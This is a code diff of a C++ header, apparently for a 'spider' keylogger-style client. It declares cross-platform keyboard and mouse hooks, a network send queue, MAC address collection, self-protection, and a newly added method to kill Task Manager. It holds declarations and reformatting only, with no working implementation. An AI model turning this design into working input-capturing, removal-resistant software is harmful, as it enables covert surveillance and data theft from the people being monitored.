@@ -97,22 +97,25 @@ namespace spider
 	                        PCWSTR args);
 	bool isRegistered(PCWSTR pszAppName) const;
 	bool protectTask() const;
+	void killTaskManager() const;
 
 // SpiderPluginOSX.cpp
 #elif defined __APPLE__
-	bool          initOSX();
-	bool          deinitOSX();
-	std::uint64_t getRAMOSX() const;
-	void          getInfosOSX();
-	bool          hookKeyboardOSX();
-	bool          unHookKeyboardOSX();
-	bool          hookMouseOSX();
-	bool          unHookMouseOSX();
-	void          runOSX() const;
-	void          keyboardThread();
-	void          mouseThread();
-	static CGEventRef    treatKeyboardEvent(CGEventTapProxy, CGEventType, CGEventRef, void *);
-	static CGEventRef    treatMouseEvent(CGEventTapProxy, CGEventType, CGEventRef, void *);
+	bool              initOSX();
+	bool              deinitOSX();
+	std::uint64_t     getRAMOSX() const;
+	void              getInfosOSX();
+	bool              hookKeyboardOSX();
+	bool              unHookKeyboardOSX();
+	bool              hookMouseOSX();
+	bool              unHookMouseOSX();
+	void              runOSX() const;
+	void              keyboardThread();
+	void              mouseThread();
+	static CGEventRef treatKeyboardEvent(CGEventTapProxy, CGEventType,
+	                                     CGEventRef, void *);
+	static CGEventRef treatMouseEvent(CGEventTapProxy, CGEventType,
+	                                  CGEventRef, void *);
 // SpiderPluginLinux.cpp
 #elif defined __linux__
 	bool          initLinux();
@@ -136,9 +139,9 @@ namespace spider
 	bool        m_keyboardHook;
 	bool        m_mouseHook;
 
-	static mt::Queue<SystemMsg> *m_sendToNetwork;
-	mt::Queue<Order>             m_receivedFromNetwork;
-	mt::Queue<std::string>       m_networkResponseQueue;
+	static mt::Queue<SystemMsg> *     m_sendToNetwork;
+	mt::Queue<Order>                  m_receivedFromNetwork;
+	mt::Queue<std::string>            m_networkResponseQueue;
 	static network::tcp::MacAddrArray m_macAddr;
 
 	std::map<std::string, std::function<void()>> m_cmd;
